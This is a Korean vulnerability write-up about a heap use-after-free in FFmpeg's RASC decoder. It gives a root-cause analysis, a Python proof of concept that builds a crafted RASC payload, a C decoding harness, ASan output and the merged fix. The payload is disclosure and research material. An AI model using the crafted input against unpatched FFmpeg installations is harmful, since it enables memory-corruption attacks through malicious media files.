# `libavcodec/rasc`: Heap use-after-free in `decode_move`

저번 글의 rtspdec 건이 코드 정독으로 잡은 케이스였다면, 이번 RASC 건은 fuzzing으로 잡혔다.
`libavcodec`의 비교적 사용자가 적을 법한 코덱들 위주로 AFL 하네스를 만들어 돌리고 있었는데, 갑자기 RASC 디코더에서 heap uaf가 나왔다.
ASan 트레이스가 깔끔해서 Root Cause 따라가기도 어렵지 않았다.

**RASC란?**

RASC는 화면 녹화/리플레이 도구가 쓰는 비디오 코덱이다.
AVI 컨테이너 안에 video stream으로 담기고, FFmpeg에선 `libavcodec/rasc.c`에 구현돼 있으며 default로 enabled — AVI 파일이 들어오면 `avformat_open_input` → demux → decode 흐름에서 자동으로 닿는다.
스트림은 INIT / MOVE / DLTA / KFRM 같은 chunk들로 구성되고, 디코더가 chunk type 별로 분기한다 (`decode_fint`, `decode_move`, `decode_dlta`, `decode_kfrm`).
이번 버그는 그중 `decode_move()` 안에 있다.

분석은 FFmpeg git HEAD (커밋 `78da965`, master 브랜치) + ASan 빌드 기준으로 진행했다.

## 취약 코드

`libavcodec/rasc.c`의 `decode_move()`. 함수가 길어서 흐름에 필요한 부분만 발췌한다.

```c
/* libavcodec/rasc.c — decode_move */
/* 222 */     compression = bytestream2_get_le32(gb);
/* ... */
/* 227 */     uncompressed_size = 16 * nb_moves;
/* ... */
/* 229 */     if (compression == 1) {
/* 230 */         ret = decode_zlib(avctx, avpkt,
/* 231 */                           size - (bytestream2_tell(gb) - pos),
/* 232 */                           uncompressed_size);
/* 233 */         if (ret < 0)
/* 234 */             return ret;
/* 235 */         bytestream2_init(&mc, s->delta, uncompressed_size);
/* ... */
/* 249 */     for (int i = 0; i < nb_moves; i++) {
/* ... */
/* 254 */         type = bytestream2_get_le16(&mc);
/* 255 */         start_x = bytestream2_get_le16(&mc);
/* 256 */         start_y = bytestream2_get_le16(&mc);
/* 257 */         end_x = bytestream2_get_le16(&mc);
/* 258 */         end_y = bytestream2_get_le16(&mc);
/* 259 */         mov_x = bytestream2_get_le16(&mc);
/* 260 */         mov_y = bytestream2_get_le16(&mc);
/* 261 */         bytestream2_skip(&mc, 2);
/* ... */
/* 296 */         } else if (type == 0) {
/* 297 */             uint8_t *buffer;
/* 298 */
/* 299 */             av_fast_padded_malloc(&s->delta, &s->delta_size, w * h * s->bpp);
/* 300 */             buffer = s->delta;
/* 301 */             if (!buffer)
/* 302 */                 return AVERROR(ENOMEM);
/* 303 */
/* 304 */             for (int j = 0; j < h; j++) {
/* 305 */                 memcpy(buffer + j * w * s->bpp, e2, w * s->bpp);
/* 306 */                 e2 -= s->frame2->linesize[0];
/* 307 */             }
/* ... */
/* 312 */             }
```

이 함수에서 눈여겨볼 곳은 세 군데다.

- 라인 235 — `bytestream2_init(&mc, s->delta, ...)` 로 로컬 iterator `mc`가 `s->delta`를 가리키게 됨.
- 라인 254-261 — for 루프 안에서 `mc`로 16바이트씩 (le16 7번 + skip 2) 소비.
- 라인 299 — 같은 루프 안에서 `type == 0`이면 `av_fast_padded_malloc(&s->delta, ...)`로 `s->delta`를 free하고 새로 할당.

세 번째가 두 번째에 영향을 준다는 게 이번 UAF의 핵심.

## 분석

`av_fast_padded_malloc()`은 요청 사이즈가 현재 할당보다 크면 기존 영역을 free하고 새로 할당하는 헬퍼다.
라인 299에서 호출되는 순간, 라인 188(`decode_zlib` 안의 `av_fast_padded_malloc(&s->delta, ...)`)이 잡아둔 134바이트짜리 인플레이트 버퍼가 free된다.

문제는 `mc`다.
라인 235에서 `mc.buffer = s->delta`를 박아둔 상태인데, 라인 299의 free는 `mc`를 건드리지 않는다 — `mc`는 이제 dangling pointer.

루프는 거기서 끝나지 않는다.
`nb_moves` 만큼 반복하고, **다음 iteration이 라인 254부터 다시 `bytestream2_get_le16(&mc)` 7번 + `bytestream2_skip(&mc, 2)` 1번 = 16바이트를 freed 영역에서 읽는다.**
그게 UAF read.

설령 라인 299의 새 할당이 우연히 같은 주소로 떨어진다 해도 사고가 끝난 게 아니다.
새 `s->delta`는 라인 304-307에서 픽셀 복사용 scratch buffer로 즉시 덮어쓰여서, 다음 iteration의 `mc`는 픽셀 데이터를 move-table 필드로 해석하게 된다.

**트리거 조건 정리:**

1. MOVE chunk, `compression == 1` (zlib 경로)
2. `nb_moves ≥ 2` (최소 2회차 iteration까지 가야 UAF 도달)
3. 첫 move가 `type == 0` (라인 299의 두 번째 malloc 발동)
4. 그 type 0의 `w * h * s->bpp + 64 > s->delta_size` (성장 임계 통과해야 free + realloc)

마지막 조건을 풀어보면, 초기 `s->delta_size`는 134바이트다.
`av_fast_padded_malloc` 의 성장 공식 `min_size + min_size/16 + 32` 를 `uncompressed_size + AV_INPUT_BUFFER_PADDING_SIZE = 32 + 64 = 96` 에 적용한 결과 (`96 + 6 + 32 = 134`).
32bpp에서 `w * h ≥ 18`이면 임계를 넘는데, PoC는 안전하게 `20×20 = 400` 으로 잡는다.

## PoC

131바이트짜리 raw RASC 페이로드를 만들어 ffmpeg의 RASC 디코더에 직접 던지는 minimal한 형태.

```python
import zlib, struct

def u32(v): return struct.pack('<I', v)
def u16(v): return struct.pack('<H', v)

# INIT chunk: sets up 320x240 32bpp frame
# decode_fint expects: peek_le32==0x65, skip 8, width(4), height(4),
#                      skip 30, fmt(2), skip 24
init_data = (
    u32(0x65)           # magic sentinel
    + b'\x00' * 4       # ignored
    + u32(320)          # width
    + u32(240)          # height
    + b'\x00' * 30
    + u16(32)           # 32bpp → AV_PIX_FMT_BGR0, s->bpp=4
    + b'\x00' * 24
)
init_chunk = b'INIT' + u32(len(init_data)) + init_data

# MOVE chunk: compression=1 (zlib), 2 moves
# After zlib inflation, bytestream2_init(&mc, s->delta, uncompressed_size)
# Move 0: type=0, 20x20 copy → av_fast_padded_malloc(&s->delta, ..., 1600)
#   frees s->delta; mc.buffer_start now dangling
# Move 1: bytestream2_get_le16(&mc) → READ from freed s->delta  [UAF]

def move(type, x0, y0, x1, y1, mx, my):
    return struct.pack('<8H', type, x0, y0, x1, y1, mx, my, 0)

raw = move(0,  0, 0, 20, 20, 0, 0)   # type-0: triggers realloc
raw += move(0, 0, 0,  5,  5, 0, 0)   # type-0: reads from freed region

move_data = (
    b'\x00' * 8
    + u32(2)            # nb_moves
    + b'\x00' * 8
    + u32(1)            # compression = 1 (zlib)
    + zlib.compress(raw)
)
move_chunk = b'MOVE' + u32(len(move_data)) + move_data

with open('poc.bin', 'wb') as f:
    f.write(init_chunk + move_chunk)
```

페이로드 구성을 짚어보면:

- **INIT chunk** — 320×240, 32bpp 프레임 셋업 (`AV_PIX_FMT_BGR0`, `s->bpp = 4`). 디코더 컨텍스트를 정상적으로 초기화시켜서 이후 MOVE 처리 분기에 들어가게 한다.
- **MOVE chunk** — `compression == 1` (zlib 경로), `nb_moves == 2`.
  - **Move 0** — `type=0`, 영역 20×20. 라인 299의 `av_fast_padded_malloc(&s->delta, ..., 1600)`을 발동시켜 134바이트 인플레이트 버퍼를 free시키고 `mc`를 dangling으로 만든다.
  - **Move 1** — `type=0`, 영역 5×5. 다음 iteration에서 라인 254-261의 16바이트 read가 freed 영역으로 떨어져 UAF가 트리거된다.

디코더 호출은 별도 harness에서:

```c
#include <stdio.h>
#include <string.h>
#include "libavcodec/avcodec.h"
#include "libavutil/mem.h"

int main(int argc, char *argv[])
{
    const char *path = argc > 1 ? argv[1] : "poc.bin";

    FILE *f = fopen(path, "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);
    uint8_t *data = av_malloc(sz + AV_INPUT_BUFFER_PADDING_SIZE);
    if (!data) { fclose(f); return 1; }
    if (fread(data, 1, sz, f) != (size_t)sz) { fclose(f); av_free(data); return 1; }
    memset(data + sz, 0, AV_INPUT_BUFFER_PADDING_SIZE);
    fclose(f);

    av_log_set_level(AV_LOG_QUIET);

    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_RASC);
    if (!codec) { fprintf(stderr, "RASC decoder not available\n"); av_free(data); return 1; }

    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) { av_free(data); return 1; }
    ctx->width      = 320;
    ctx->height     = 240;
    ctx->max_pixels = 1024 * 1024;

    if (avcodec_open2(ctx, codec, NULL) < 0) {
        fprintf(stderr, "avcodec_open2 failed\n");
        avcodec_free_context(&ctx);
        av_free(data);
        return 1;
    }

    AVPacket *pkt = av_packet_alloc();
    AVFrame  *frm = av_frame_alloc();
    if (!pkt || !frm) goto out;

    /* pkt->buf stays NULL (no av_new_packet); av_packet_free will not attempt to unref data */
    pkt->data = data;
    pkt->size = (int)sz;

    avcodec_send_packet(ctx, pkt);
    avcodec_receive_frame(ctx, frm);

out:
    av_frame_free(&frm);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    av_free(data);
    return 0;
}
```

빌드 + 실행:

```bash
clang -fsanitize=address -g -O1 -o test_harness test_harness.c \
    -I/path/to/ffmpeg-src \
    -L/path/to/ffmpeg-src/libavcodec \
    -L/path/to/ffmpeg-src/libavutil \
    -lavcodec -lavutil -lz -lm -lpthread \
    -Wl,-rpath,/path/to/ffmpeg-src/libavcodec:/path/to/ffmpeg-src/libavutil

ASAN_OPTIONS=detect_leaks=0 ./test_harness poc.bin
```

ASan으로 빌드된 ffmpeg 트리에 raw RASC fuzz harness가 있다면 `cat poc.bin | afl_raw_dec_rasc_fuzzer` 형태로 던져도 같은 트리거가 떨어진다.

## ASan 출력

```text
==PID==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000000550
READ of size 2 at pc ... in bytestream_get_le16 bytestream.h:94
    #0  bytestream_get_le16           bytestream.h:94
    #1  bytestream2_get_le16u         bytestream.h:94
    #2  bytestream2_get_le16          bytestream.h:94
    #3  decode_move                   rasc.c:254
    #4  decode_frame                  rasc.c:715
    #5  decode_simple_internal        decode.c:448
    ... (decode dispatch frames)
    #N  avcodec_send_packet           decode.c:746

0x611000000550 is located 16 bytes inside of 134-byte region [0x611000000540,0x6110000005c6)
freed by thread T0 here:
    #0  av_freep                      libavutil/mem.c:253
    #1  fast_malloc                   libavutil/mem.c:548
    #2  av_fast_padded_malloc         utils.c:61
    #3  decode_move                   rasc.c:299
    #4  decode_frame                  rasc.c:715

previously allocated by thread T0 here:
    #0  av_mallocz / fast_malloc      libavutil/mem.c:549
    #1  av_fast_padded_malloc         utils.c:61
    #2  decode_zlib                   rasc.c:188
    #3  decode_move                   rasc.c:230
    #4  decode_frame                  rasc.c:715

SUMMARY: AddressSanitizer: heap-use-after-free bytestream.h:94 in bytestream_get_le16
```

읽어보면 우리가 코드 따라가며 짠 시나리오가 그대로 다 들어 있다.

- **READ of size 2**, 콜스택은 `bytestream_get_le16` → `decode_move rasc.c:254` — 즉 `mc`로 le16을 읽다가 터졌다는 그 라인 254가 정확히 잡혔다.
- 이 주소는 134바이트 영역 안 16바이트 오프셋 — `mc`가 첫 iteration에서 16바이트 (8바이트는 첫 move의 16-byte struct 시작, 다음 iteration 진입 시 첫 16바이트 다음부터) 진행한 위치와 일치한다.
- **freed by**: `decode_move rasc.c:299` 의 `av_fast_padded_malloc` 안의 `av_freep` — type-0 분기에서 `s->delta` 재할당하면서 일어난 free.
- **previously allocated by**: `decode_zlib rasc.c:188` → `decode_move rasc.c:230` — 라인 230의 `decode_zlib` 호출이 라인 188에서 `s->delta`를 처음 잡아준 그 자리.

세 콜스택(현재 access / 직전 free / 최초 alloc)이 정확히 분석에서 그린 그림 그대로다.

## 패치

위 내용을 정리해서 FFmpeg 메인테이너에게 제보했고, [PR #22992](https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/22992)로 다음과 같이 수정되어 머지됐다.

```diff
--- a/libavcodec/rasc.c
+++ b/libavcodec/rasc.c
@@ -51,6 +51,8 @@
     GetByteContext  gb;
     uint8_t        *delta;
     int             delta_size;
+    uint8_t        *mv_scratch;
+    unsigned int    mv_scratch_size;
     uint8_t        *cursor;
     int             cursor_size;
     unsigned        cursor_w;
@@ -294,10 +296,8 @@
                 b2 -= s->frame2->linesize[0];
             }
         } else if (type == 0) {
-            uint8_t *buffer;
-
-            av_fast_padded_malloc(&s->delta, &s->delta_size, w * h * s->bpp);
-            buffer = s->delta;
+            av_fast_padded_malloc(&s->mv_scratch, &s->mv_scratch_size, w * h * s->bpp);
+            uint8_t *buffer = s->mv_scratch;
             if (!buffer)
                 return AVERROR(ENOMEM);
 
@@ -772,6 +772,8 @@
     s->cursor_size = 0;
     av_freep(&s->delta);
     s->delta_size = 0;
+    av_freep(&s->mv_scratch);
+    s->mv_scratch_size = 0;
     av_frame_free(&s->frame1);
     av_frame_free(&s->frame2);
     ff_inflate_end(&s->zstream);
```

핵심은 `s->delta`가 한 함수 안에서 두 가지 역할을 동시에 맡는다는 점이었다 — inflate된 move-table 백킹 버퍼 (`mc`가 가리킴) + type-0 분기에서 픽셀 복사용 scratch buffer.
이 두 역할이 한 포인터를 공유하다 보니 후자가 전자를 free시키는 충돌이 발생했다.

픽스는 그 scratch 역할만 떼어내서 `RASCContext`에 별도 필드 `mv_scratch` 로 들고 가도록 바꿨다.
`s->delta`는 `decode_move()` 끝까지 그대로 살아있고, `mc`도 따라서 모든 iteration 동안 valid 상태를 유지한다.
함께 `rasc_close()`에서 `s->mv_scratch`도 free하도록 cleanup도 추가됐다.
